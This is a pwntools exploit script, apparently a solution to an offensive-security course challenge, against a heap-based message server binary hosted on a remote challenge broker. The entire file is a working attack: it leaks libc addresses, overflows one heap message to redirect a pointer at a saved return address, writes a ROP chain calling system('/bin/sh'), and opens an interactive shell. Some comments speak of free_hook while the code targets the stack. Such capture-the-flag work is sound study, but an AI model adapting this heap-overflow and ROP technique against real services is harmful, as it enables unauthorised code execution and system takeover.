from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./big_message_server_v2.0"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1222)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

def menu(p, option):
    p.recvuntil(b"> ")
    p.sendline(str(option).encode())

def add_message(p, message):
    p.recvuntil(b"> ")
    p.send(message)

def send_message(p, message_number):
    p.recvuntil(b"> ")
    p.send(str(message_number).encode())

def edit_message(p, message_number, message):
    p.recvuntil(b"> ")
    p.send(str(message_number).encode())
    p.recvuntil(b"> ")
    p.send(message)

def read_message(p, message_number):
    p.recvuntil(b"> ")
    p.sendline(str(message_number).encode())
    p.recvuntil(b"Your message is ")
    heap_leak = p.recvline()
    return heap_leak

# Get the address of printf from the server and calculate the libc base address
p.recvuntil(b"helpful message: ")
leaked_printf = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f'printf_address: {hex(leaked_printf)}')

# Get the address of printf from the server and calculate the libc base address
p.recvuntil(b"helpful message: ")
leaked_environ = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f'__environ_address: {hex(leaked_environ)}')

libc_elf = ELF(libc)
libc_elf.address = leaked_printf - libc_elf.symbols.printf
print(f'libc.address: {hex(libc_elf.address)}')

bin_sh_address = next(libc_elf.search(b"/bin/sh"))
print(f'bin sh address: {hex(bin_sh_address)}')

system = libc_elf.symbols.system
print(f'system: {hex(system)}')

rip_address = leaked_environ - 0x158
print(f'edit_rip_address: {hex(rip_address)}')

# Let's get the base address of the heap and the tcache key
# Start interacting with the binary
menu(p, 1) # add_message
add_message(p, b"A" * 0x40)  # message 1
menu(p, 1) # add_message
add_message(p, b"B" * 0x40)  # message 1
menu(p, 1) # add_message
add_message(p, b"C" * 0x40)  # message 1

menu(p, 1)
add_message(p, b"A" * 0x3f + b'\00') # message 0
menu(p, 1)
add_message(p, b"B" * 0x3f + b'\00') # message 1
menu(p, 1)
add_message(p, b"B" * 0x3f + b'\00') # message 2

# When editing, the next message address of the index - 1 message will be used to store the message data.
# In order to bypass the first 8 bytes, 8 bytes are added to the index - 1 next message address.
# By editing the index - 1 message we are trying to poison, we overflow the index -1 message and set the
# next message address to the address to that of free_hook - 0x8, that way when the binary adds 0x8 bytes
# it will point to free_hook, and we can set it in the next edit to system.

# Overflow message 0 to have message 1 free_hook - 0x8
menu(p, 3)
edit_message(p, 0, b"F" * 0x3f + b'\00' + p64(0x51) + p64(rip_address))

# Edit message 2, which address will be used from message 1's next message pointer + 0x8 and point it to system

libc_rop = ROP(libc)

chain = [
    libc_rop.ret.address + libc_elf.address,
    libc_rop.rdi.address + libc_elf.address,
    bin_sh_address,
    system
    ]

menu(p, 3)
edit_message(p, 2, b"".join([p64(c) for c in chain]))



p.interactive()